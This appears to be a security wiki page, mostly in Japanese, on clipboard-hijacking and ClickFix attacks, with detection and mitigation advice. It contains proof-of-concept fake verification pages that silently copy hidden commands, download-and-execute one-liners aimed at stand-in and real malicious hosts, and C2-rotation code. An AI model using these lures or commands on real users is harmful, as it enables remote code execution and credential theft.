# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> 「自分でコピーしていないものは絶対に貼り付けるな。」— 古いが今でも有効な助言

## 概要

Clipboard hijacking – also known as *pastejacking* – は、ユーザーがコマンドを検査せずにコピー＆ペーストする習慣を悪用します。悪意あるウェブページ（または Electron や Desktop アプリケーションなどの JavaScript 実行可能なコンテキスト）は、攻撃者が制御するテキストをプログラム的にシステムのクリップボードに置きます。被害者は通常、巧妙に作られたソーシャルエンジニアリングの指示に従って **Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell）を押すかターミナルを開いてクリップボードの内容を貼り付け（*paste*）し、即座に任意のコマンドを実行してしまいます。

ファイルがダウンロードされず添付ファイルも開かれないため、**no file is downloaded and no attachment is opened** この手法は、添付ファイル、マクロ、または直接的なコマンド実行を監視するほとんどのメールおよびウェブコンテンツのセキュリティ制御をバイパスします。したがって、この攻撃は NetSupport RAT、Latrodectus loader、Lumma Stealer のような汎用マルウェアを配布する phishing キャンペーンで人気があります。

## 強制コピー ボタンと隠されたペイロード (macOS one-liners)

一部の macOS 用 infostealer はインストーラサイト（例: Homebrew）をクローンし、ユーザーが表示されているテキストのみをハイライトできないように **“Copy” ボタンの使用を強制** します。クリップボードのエントリには期待されるインストールコマンドに加えて Base64 ペイロードが追記され（例: `...; echo <b64> | base64 -d | sh`）、1 回の貼り付けで両方が実行される一方で UI はその追加ステージを隠します。

## JavaScript の概念実証
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
以前のキャンペーンは `document.execCommand('copy')` を使用していましたが、最近のものは非同期の **Clipboard API** (`navigator.clipboard.writeText`) に依存しています。

## ClickFix / ClearFake のフロー

1. ユーザーがタイポスクワットされた、または侵害されたサイトにアクセスする（例: `docusign.sa[.]com`）
2. 注入された **ClearFake** JavaScript は `unsecuredCopyToClipboard()` ヘルパーを呼び出し、クリップボードに Base64 エンコードされた PowerShell のワンライナーを静かに格納します。
3. HTML の指示は被害者に次のように促します: *“**Win + R** を押し、コマンドを貼り付けて Enter を押して問題を解決してください。”*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意のある DLL を含むアーカイブをダウンロードします（典型的な DLL sideloading）。
5. ローダーは追加ステージを復号化し、shellcode を注入し、永続化（例: scheduled task）をインストールします — 最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行します。

### NetSupport RAT チェーンの例
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（正規の Java WebStart）は、自身のディレクトリ内で `msvcp140.dll` を検索します。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** を使って二つのバイナリ（`data_3.bin`、`data_4.bin`）をダウンロードし、rolling XOR key `"https://google.com/"` を使ってそれらを復号し、最終的な shellcode を注入して **client32.exe**（NetSupport RAT）を `C:\ProgramData\SecurityCheck_v1\` に解凍します。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` を **curl.exe** でダウンロードする
2. **cscript.exe** 内で JScript downloader を実行する
3. MSI payload を取得 → サインされたアプリケーションの横に `libcef.dll` を配置 → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer を MSHTA 経由で
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一部の ClickFix キャンペーンはファイルのダウンロードを完全に省略し、被害者に WSH 経由で JavaScript を取得して実行するワンライナーを貼り付けさせ、それを永続化し、C2 を日次でローテーションするよう指示します。観測されたチェーンの例：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- Obfuscated URL を実行時に反転して、簡易な解析を回避する。
- JavaScript は Startup LNK (WScript/CScript) を介して永続化し、現在の日付で C2 を選択する — これにより迅速な domain rotation が可能になる。

Minimal JS fragment used to rotate C2s by date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では、永続性を確立して RAT（例: PureHVNC）を引き込む loader を展開することが一般的で、しばしば TLS をハードコードされた証明書にピン留めし、トラフィックを分割して送信します。

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近のキャンペーンでは、偽の CDN/browser verification ページ（"Just a moment…", IUAM-style）を大量生産し、ユーザに OS 固有のコマンドを clipboard からネイティブコンソールへコピーさせることでブラウザのサンドボックス外でコード実行を誘導します。これにより Windows と macOS 両方で動作します。

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS の初回実行の永続化
- 次のコマンドを使用する: `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` — 端末が閉じた後も実行が継続され、目に見える痕跡を減らす。

侵害されたサイトでの in-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM スタイルの誘導に特化した検出・ハンティングのアイデア

- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 年の fake CAPTCHA / ClickFix の進化 (ClearFake, Scarlet Goldfinch)

- ClearFake は引き続き WordPress サイトを侵害し、loader JavaScript を注入して外部ホスト（Cloudflare Workers、GitHub/jsDelivr）やブロックチェーン “etherhiding” 呼び出し（例: POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`）をチェーンして現在の誘導ロジックを取得しています。最近のオーバーレイは、ダウンロードの代わりにユーザにワンライナーをコピー／ペーストさせる（T1204.004）fake CAPTCHA を多用しています。
- 初期実行はますます signed script hosts/LOLBAS に委譲されています。2026年1月のチェーンでは以前の `mshta` 使用が、`WScript.exe` 経由で実行される組み込みの `SyncAppvPublishingServer.vbs` に置き換えられ、PowerShell 風の引数（エイリアス／ワイルドカード）を渡してリモートコンテンツを取得するようになりました:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` は署名されており通常 App-V によって使用されます; `WScript.exe` と異常な引数（`gal`/`gcm` エイリアス、ワイルドカード化された cmdlets、jsDelivr URLs）と組み合わせると、ClearFake に対する高シグナルな LOLBAS ステージになります。
- 2026年2月の偽 CAPTCHA ペイロードは再び純粋な PowerShell ダウンロードクレードルへと戻りました。実例が2つあります:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 最初のチェーンはメモリ上で動作する `iex(irm ...)` grabber；2 番目は `WinHttp.WinHttpRequest.5.1` 経由でステージングし、一時的な `.ps1` を書き込み、隠しウィンドウで `-ep bypass` を付けて起動します。

検出／ハンティングのヒント（これらの亜種）
- プロセス系譜: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` または PowerShell cradles が clipboard 書き込み / Win+R の直後に発生する。
- コマンドラインキーワード: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker ドメイン、または生の IP を使った `iex(irm ...)` パターン。
- ネットワーク: ウェブ閲覧直後にスクリプトホスト/PowerShell から CDN worker ホストや blockchain RPC エンドポイントへの発信接続。
- ファイル／レジストリ: `%TEMP%` 配下の一時 `.ps1` 作成や、これらのワンライナーを含む RunMRU エントリ；外部 URL や難読化されたエイリアス文字列で実行される signed-script LOLBAS (WScript/cscript/mshta) はブロック／アラートする。

## Mitigations

1. Browser hardening – クリップボード書き込みアクセスを無効化（`dom.events.asyncClipboard.clipboardItem` 等）またはユーザー操作を要求する。
2. Security awareness – ユーザーに機密コマンドを*タイプ*させるか、まずテキストエディタに貼り付けて確認させる。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control によって任意のワンライナーをブロックする。
4. Network controls – 既知の pastejacking やマルウェア C2 ドメインへの発信をブロックする。

## Related Tricks

* **Discord Invite Hijacking** は、ユーザーを悪意のあるサーバーに誘導した後に同じ ClickFix アプローチを悪用することが多い:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 参考文献

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
